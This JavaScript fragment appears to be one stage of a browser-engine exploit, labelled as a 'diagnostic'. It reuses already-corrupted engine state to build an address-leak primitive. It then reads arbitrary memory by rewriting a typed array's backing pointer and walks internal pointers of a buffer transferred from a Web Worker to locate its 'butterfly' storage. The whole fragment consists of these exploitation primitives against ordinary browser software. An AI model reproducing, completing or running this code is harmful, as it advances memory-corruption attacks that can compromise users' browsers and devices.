return new Promise(function (resolve) {
  var state = window.__fw14ArrayState;
  var settled = false;
  var worker = null;
  var workerUrl = null;
  var timer = null;
  var phase = "preflight";
  function finish(status, details) {
    if (settled) return;
    settled = true;
    if (timer !== null) clearTimeout(timer);
    if (worker) worker.terminate();
    if (workerUrl) URL.revokeObjectURL(workerUrl);
    resolve([{ id: "worker_butterfly_diag_v1", status: status,
               details: details }]);
  }
  try {
    if (!state || !state.view || !state.array || !state.a ||
        !state.ownedTypedView || !Number.isSafeInteger(state.calibratedViewBase) ||
        state.array[0] !== state.a)
      throw new Error("held_view_missing");
    var forged = state.view;
    var a = state.ownedTypedView;
    var base = state.calibratedViewBase;
    if (a.length !== 65536 || a[0] !== 0x31 || a[7] !== 0xa8 ||
        !Number.isSafeInteger(base) || base % 4096 !== 0)
      throw new Error("held_view_changed");
    function bytesAt(index) {
      var out = [];
      for (var i = 0; i < 8; i++) out.push(forged[index + i]);
      return out;
    }
    function integerOf(bytes) {
      var out = 0;
      for (var i = 7; i >= 0; i--) out = out * 256 + bytes[i];
      return out;
    }
    function pointerBytes(value) {
      var out = [];
      for (var i = 0; i < 8; i++)
        out.push(Math.floor(value / Math.pow(2, i * 8)) & 255);
      return out;
    }
    function addressOf(value) {
      try {
        state.array[0] = value;
        return integerOf(bytesAt(state.index));
      } finally {
        state.array[0] = state.a;
      }
    }
    var aIndex = addressOf(a) - base;
    var slot = aIndex + 8;
    if (!Number.isSafeInteger(slot) || slot < 0 || slot + 8 >= 16777216)
      throw new Error("slot_invalid");
    var original = bytesAt(slot);
    function readAt(address, length) {
      var next = pointerBytes(address);
      try {
        for (var i = 0; i < 8; i++) forged[slot + i] = next[i];
        var out = [];
        for (var j = 0; j < length; j++) out.push(a[j]);
        return out;
      } finally {
        for (var k = 0; k < 8; k++) forged[slot + k] = original[k];
      }
    }
    function ptr(bytes, at) {
      return integerOf(bytes.slice(at, at + 8));
    }
    function hex(value) {
      return "0x" + value.toString(16);
    }
    phase = "worker_create";
    var workerSource = [
      "var marker = new Uint32Array(new ArrayBuffer(0x10));",
      "marker[0] = 0x7a6b5c4d; marker[1] = 0x1234cafe;",
      "marker[2] = 0x55aa33cc; marker[3] = 0xcc33aa55;",
      "self.onmessage = function (event) {",
      "  if (event.data && event.data.name === 'ping') {",
      "    self.postMessage({ id: 0, type: 'ret', value: 'pong' });",
      "    return;",
      "  }",
      "};",
      "self.postMessage({ id: 1, type: 'ret', value: marker }, [marker.buffer]);"
    ].join("\n");
    workerUrl = URL.createObjectURL(new Blob([workerSource],
                                        { type: "text/javascript" }));
    worker = new Worker(workerUrl);
    timer = setTimeout(function () {
      finish("error", { phase: "worker_reply", error: "timeout" });
    }, 15000);
    worker.onerror = function (event) {
      finish("error", { phase: "worker",
        error: String(event.message || "worker_error").slice(0, 180) });
    };
    var pingDone = false;
    worker.onmessage = function (event) {
      if (settled) return;
      try {
        if (event.data && event.data.id === 0 &&
            event.data.value === "pong") {
          pingDone = true;
          return;
        }
        phase = "walk_chain";
        var typed = event.data && event.data.type === "ret" &&
          event.data.id === 1 && event.data.value;
        if (!(typed instanceof Uint32Array) || typed.length !== 4)
          throw new Error("marker_mismatch");
        var cell = addressOf(typed.buffer);
        var cellBytes = readAt(cell, 32);
        var impl = ptr(cellBytes, 0x10);
        var implBytes = readAt(impl, 32);
        var data = ptr(implBytes, 0x10);
        var backing = readAt(data, 32);
        var storage = ptr(backing, 0x10);
        var message = ptr(readAt(storage, 8), 0);
        var messageBytes = readAt(message, 8);
        var butterfly = ptr(messageBytes, 0);
        var restoredNow = a[0] === 0x31 && a[7] === 0xa8 &&
          state.array[0] === state.a;
        var messageHex = "";
        for (var mi = 0; mi < messageBytes.length; mi++)
          messageHex += messageBytes[mi].toString(16).padStart(2, "0");
        finish("pass",
          { cell: hex(cell), impl: hex(impl),
            data: hex(data), storage: hex(storage),
            message: hex(message), message_bytes: messageHex,
            butterfly: hex(butterfly),
            restored: restoredNow });
      } catch (error) {
        finish("error", { phase: phase, error: String(error).slice(0, 180) });
      }
    };
    worker.postMessage({ id: 0, name: "ping", args: [] });
  } catch (error) {
    finish("error", { phase: phase, error: String(error).slice(0, 180) });
  }
});
